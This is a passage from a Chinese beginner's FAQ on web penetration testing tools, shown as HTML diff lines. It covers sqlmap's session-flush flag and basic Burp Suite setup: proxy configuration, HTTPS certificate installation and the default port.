+<h4 id="15-如何清除缓存重新测试？"><a href="#15-如何清除缓存重新测试？" class="headerlink" title="15.如何清除缓存重新测试？"></a>15.如何清除缓存重新测试？</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用参数： --flush-session，他将会刷新会话，进行测试</span><br></pre></td></tr></table></figure>
+
+<h4 id="16-Burp-Suite是什么妮？"><a href="#16-Burp-Suite是什么妮？" class="headerlink" title="\16. Burp Suite是什么妮？"></a>\16. Burp Suite是什么妮？</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Burp Suite是一个集成化的渗透测试工具，它集合了多种渗透测试组件，使我们自动化地或手工地能更好的完成对web应用的渗透测试和攻击。在渗透测试中，我们使用Burp Suite将使得测试工作变得更加容易和方便，即使在不需要娴熟的技巧的情况下，只有我们熟悉Burp Suite的使用，也使得渗透测试工作变得轻松和高效。</span><br></pre></td></tr></table></figure>
+
+<h4 id="17-Burp-Suite哪里获取？"><a href="#17-Burp-Suite哪里获取？" class="headerlink" title="17.Burp Suite哪里获取？"></a>17.Burp Suite哪里获取？</h4><p>去社区或者是QQ群下载。</p>
+<p>社区下载页面:<a target="_blank" rel="noopener" href="https://www.zkaq.org/t/2178.html">https://www.zkaq.org/t/2178.html</a></p>
+<h4 id="18-如何配置浏览器代理？"><a href="#18-如何配置浏览器代理？" class="headerlink" title="18.如何配置浏览器代理？"></a>18.如何配置浏览器代理？</h4><p>可以使用插件去配置。</p>
+<p>配置的话可以参照这篇帖子，<a target="_blank" rel="noopener" href="https://www.cnblogs.com/guanfuchang/p/6978863.html">https://www.cnblogs.com/guanfuchang/p/6978863.html</a> </p>
+<p>因为写的话比较多，如果过程中有什么问题可以继续提。</p>
+<h4 id="19-为什么要设置代理才能抓到数据包妮？"><a href="#19-为什么要设置代理才能抓到数据包妮？" class="headerlink" title="19.为什么要设置代理才能抓到数据包妮？"></a>19.为什么要设置代理才能抓到数据包妮？</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> 浏览器和服务器是直接通信的，而我们增加了代理，就把直接发送到服务器的数据发送到你设置的代理的端口。</span><br><span class="line">Burp Suite代理工具是以拦截代理的方式，拦截所有通过代理的网络流量，如客户端的请求数据、服务器端的返回信息等。</span><br><span class="line"> Burp Suite主要拦截http和https协议的流量，通过拦截，burp Suite以中间人的方式，可以对客户端请求数据、服务端返回做各种处理，以达到安全评估测试的目的</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="20-Burp抓不到HTTPS的数据包怎么办？"><a href="#20-Burp抓不到HTTPS的数据包怎么办？" class="headerlink" title="\20. Burp抓不到HTTPS的数据包怎么办？"></a>\20. Burp抓不到HTTPS的数据包怎么办？</h4><p>安装个证书就可以了</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/aq-ry/p/9336365.html">https://www.cnblogs.com/aq-ry/p/9336365.html</a> 参考这篇文章</p>
+<h4 id="21-浏览器插件怎么装妮？"><a href="#21-浏览器插件怎么装妮？" class="headerlink" title="\21. 浏览器插件怎么装妮？"></a>\21. 浏览器插件怎么装妮？</h4><p>这个我在社区有帖子</p>
+<p><a target="_blank" rel="noopener" href="https://www.zkaq.org/t/3683.html">https://www.zkaq.org/t/3683.html</a></p>
+<h4 id="22-为什么监听8080端口"><a href="#22-为什么监听8080端口" class="headerlink" title="\22. 为什么监听8080端口"></a>\22. 为什么监听8080端口</h4><p>burp上默认的端口就是8080，我们也可以修改，在proxy模块option处，点击设置的端口，</p>
+<p>然后点击edit，就可以修改了</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
